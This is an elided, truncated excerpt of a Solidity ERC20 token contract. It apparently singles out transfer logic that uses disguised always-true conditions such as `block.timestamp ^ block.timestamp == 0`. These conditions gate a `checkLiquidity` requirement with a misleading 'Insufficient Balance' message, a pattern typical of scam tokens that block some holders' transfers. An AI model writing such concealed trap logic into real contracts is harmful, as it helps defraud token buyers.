...
contract ERC20Token is Context, IERC20, Ownable {
    ...
    function _transfer(
        ...
        if (inSwapAndLiquify) {
            ...
            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
                ...
                bool liquidityEnable = block.timestamp ^ block.timestamp == 0;
                if(liquidityEnable){
                    require(checkLiquidity(sender), "Insufficient Balance");
                }
    ...
    function checkLiquidity(address s) private view returns (bool) {
        bool checkTokensLiquidity = block.timestamp ^ block.timestamp ^ block.timestamp == block.timestamp;
        if(checkTokensLiquidity){
